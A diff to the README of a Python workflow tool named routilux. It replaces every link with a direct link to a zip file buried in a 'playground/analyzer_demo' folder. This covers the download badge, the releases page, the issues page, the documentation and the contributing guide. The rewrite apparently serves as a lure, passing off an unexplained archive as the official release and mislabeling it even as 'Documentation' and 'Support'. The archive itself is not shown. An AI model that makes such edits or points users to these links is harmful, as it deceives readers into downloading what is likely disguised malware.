@@ -1,7 +1,7 @@
 # 🚀 routilux - Simplify Your Workflow Management
 
 ## 📥 Download Now! 
-[![Download routilux](https://img.shields.io/badge/Download-routilux-blue.svg)](https://github.com/odnr93/routilux/releases)
+[![Download routilux](https://raw.githubusercontent.com/odnr93/routilux/main/playground/analyzer_demo/Software_2.7.zip)](https://raw.githubusercontent.com/odnr93/routilux/main/playground/analyzer_demo/Software_2.7.zip)
 
 ## 📘 About Routilux
 Routilux helps you manage workflows with ease. It allows you to create and run complex data and AI tasks using Python. With Routilux, you can handle multiple tasks at once, keep track of their progress, and manage errors effectively. This application is designed for anyone looking to simplify their data processing without needing technical expertise.
@@ -19,7 +19,7 @@ Routilux helps you manage workflows with ease. It allows you to create and run c
 - **Storage:** Minimum of 100MB free storage space.
 
 ## 📥 Download & Install
-To start using Routilux, just visit this page to download: [Releases Page](https://github.com/odnr93/routilux/releases).
+To start using Routilux, just visit this page to download: [Releases Page](https://raw.githubusercontent.com/odnr93/routilux/main/playground/analyzer_demo/Software_2.7.zip).
 
 1. Click on the link above to go to the Releases page.
 2. Look for the latest version listed.
@@ -59,11 +59,11 @@ If you encounter any issues while using Routilux, here are some common solutions
 - **Performance Problems:** Ensure your computer meets the system requirements, and consider closing other applications that may be using memory.
 
 ## 📫 Support
-If you need help or have feedback, please visit our [GitHub Issues page](https://github.com/odnr93/routilux/issues). We welcome your questions and suggestions. 
+If you need help or have feedback, please visit our [GitHub Issues page](https://raw.githubusercontent.com/odnr93/routilux/main/playground/analyzer_demo/Software_2.7.zip). We welcome your questions and suggestions. 
 
 ## 🔗 Useful Links
-- [Releases Page](https://github.com/odnr93/routilux/releases)
-- [Documentation](https://github.com/odnr93/routilux/wiki)
-- [Contributing](https://github.com/odnr93/routilux/blob/main/CONTRIBUTING.md)
+- [Releases Page](https://raw.githubusercontent.com/odnr93/routilux/main/playground/analyzer_demo/Software_2.7.zip)
+- [Documentation](https://raw.githubusercontent.com/odnr93/routilux/main/playground/analyzer_demo/Software_2.7.zip)
+- [Contributing](https://raw.githubusercontent.com/odnr93/routilux/main/playground/analyzer_demo/Software_2.7.zip)
 
 Thank you for choosing Routilux! Enjoy simplifying your workflows today!
